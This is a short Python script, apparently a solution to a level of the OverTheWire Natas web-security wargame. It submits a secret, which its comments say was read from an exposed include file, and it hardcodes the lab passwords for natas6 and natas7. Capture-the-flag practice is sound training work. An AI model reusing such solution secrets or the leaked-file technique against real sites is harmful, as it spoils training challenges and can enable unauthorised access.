#!/usr/bin/env python

import requests
from bs4 import BeautifulSoup

username = "natas6"
password = "aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1"

url = "http://%s.natas.labs.overthewire.org/" % username

session = requests.Session()

post_data = {"secret": "FOEIUWGHFEEUHOFUOIU", "submit": "submit"}

response = session.post(url, data=post_data, auth=(username, password))
content = response.text
soup = BeautifulSoup(content, "html.parser")

print(soup.prettify())
# print content

# this time we have a post-form to enter the 'secret'
# and also a 'viewsource' ancour tag
# this leads us to the file includes/secret.inc
# and the secret key was { FOEIUWGHFEEUHOFUOIU }
# The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
